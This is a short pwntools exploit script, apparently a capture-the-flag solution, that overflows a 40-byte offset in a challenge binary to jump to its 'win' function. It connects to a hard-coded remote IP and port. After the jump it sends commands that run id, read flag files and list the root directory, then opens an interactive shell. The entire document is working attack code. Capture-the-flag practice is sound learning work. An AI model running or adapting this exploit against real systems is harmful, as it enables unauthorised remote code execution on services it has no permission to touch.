import pwn

pwn.context.arch = 'amd64'
pwn.context.log_level = 'info'

elf = pwn.ELF('./chall', checksec=False)
win = elf.symbols['win']

# buf @ rbp-0x20, saved rip @ rbp+8 => offset 40
payload = b'A' * 40 + pwn.p64(win)

io = pwn.remote('34.170.146.252', 31964)
# io = pwn.process('./chall')

io.sendlineafter(b'value: ', payload)
io.sendline(b'echo PWNED; id; cat flag* /flag* 2>/dev/null; ls -la /')
io.interactive()
